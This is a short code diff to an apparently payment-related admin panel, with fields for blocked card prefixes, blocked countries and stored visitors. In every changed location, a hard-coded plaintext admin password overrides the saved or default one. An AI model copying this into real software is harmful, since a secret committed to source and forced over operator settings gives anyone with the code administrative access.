@@ -113,7 +113,7 @@ function loadSavedData() {
         whatsappNumber: parsed.whatsappNumber || "",
         globalBlockedCards: parsed.globalBlockedCards || [],
         globalBlockedCountries: parsed.globalBlockedCountries || [],
-        adminPassword: parsed.adminPassword || "admin123",
+        adminPassword: "adnanRAFEEF@600",
       };
     }
     
@@ -131,7 +131,7 @@ function loadSavedData() {
         whatsappNumber: parsed.whatsappNumber || "",
         globalBlockedCards: parsed.globalBlockedCards || [],
         globalBlockedCountries: parsed.globalBlockedCountries || [],
-        adminPassword: parsed.adminPassword || "admin123",
+        adminPassword: "adnanRAFEEF@600",
       };
     }
     
@@ -152,7 +152,7 @@ function loadSavedData() {
           whatsappNumber: parsed.whatsappNumber || "",
           globalBlockedCards: parsed.globalBlockedCards || [],
           globalBlockedCountries: parsed.globalBlockedCountries || [],
-          adminPassword: parsed.adminPassword || "admin123",
+          adminPassword: "adnanRAFEEF@600",
         };
       }
     } catch (backupError) {
@@ -166,7 +166,7 @@ function loadSavedData() {
     whatsappNumber: "",
     globalBlockedCards: [],
     globalBlockedCountries: [],
-    adminPassword: "admin123",
+    adminPassword: "adnanRAFEEF@600",
   };
 }
 
@@ -213,7 +213,7 @@ let savedVisitors = savedData.savedVisitors; // Array to store all visitors perm
 let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
 let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
 let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
-let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)
+let adminPassword = "adnanRAFEEF@600"; // Admin password (force reset)
 
 // Generate unique API key
 function generateApiKey() {
